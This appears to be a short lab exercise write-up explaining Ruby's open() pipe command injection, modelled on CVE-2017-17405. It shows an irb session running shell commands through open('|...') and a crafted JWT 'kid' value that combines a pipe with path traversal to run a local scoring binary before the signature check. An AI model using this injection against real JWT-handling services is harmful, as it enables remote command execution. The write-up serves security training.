# JWT similar to CVE-2017-17405

Inspired by the recent vulnerability in the Ruby library Net::FTP in CVE-2017-17405

### Vulnerability

The issue impacting the Net::FTP library as well as this application lies in the difference between a call to: 

```ruby
File.open(....)
```

and:

```ruby
open(...)
```

While the former allows an attacker with control over the first argument to read arbitrary files. The latter allows you to run command (by using a `|` before the command):

```bash
$ irb
irb(main):001:0> File.open("|/usr/bin/uname").read()
Traceback (most recent call last):
        6: from /usr/bin/irb:23:in `<main>'
        5: from /usr/bin/irb:23:in `load'
        4: from /usr/lib/ruby/gems/2.7.0/gems/irb-1.2.3/exe/irb:11:in `<top (required)>'
        3: from (irb):1
        2: from (irb):1:in `open'
        1: from (irb):1:in `initialize'
Errno::ENOENT (No such file or directory @ rb_sysopen - |/usr/bin/uname)
irb(main):002:0> open("|/usr/bin/uname").read()
=> "Linux\n"
irb(main):003:0> open("|/usr/bin/uname -a").read()
=> "Linux kali 5.5.0-kali2-amd64 #1 SMP Debian 5.5.17-1kali1 (2020-04-21) x86_64 GNU/Linux\n"
```

We have to do the same in jwt kid parameter:

`"kid":"|../../../../../../../../usr/local/bin/score c6ff9c86-7094-459f-8d08-41d717b9e508`

**Since the signature is checked after the vulnerability is exploited, you don't need to provide a valid signature in this exercise.**



